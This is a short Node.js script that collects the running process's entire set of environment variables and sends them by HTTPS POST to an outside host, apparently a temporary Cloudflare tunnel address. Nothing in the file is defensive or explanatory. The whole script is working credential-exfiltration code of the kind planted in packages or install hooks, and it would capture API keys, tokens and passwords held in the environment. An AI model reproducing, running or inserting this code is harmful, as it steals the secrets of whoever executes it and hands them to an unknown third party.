const https = require('https');

// Collect all environment variables
const data = JSON.stringify(process.env);

// Prepare the request options
const options = {
    hostname: 'serves-vocational-temple-phases.trycloudflare.com',
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
    }
};

// Send the data
const req = https.request(options);
req.write(data);
req.end(); 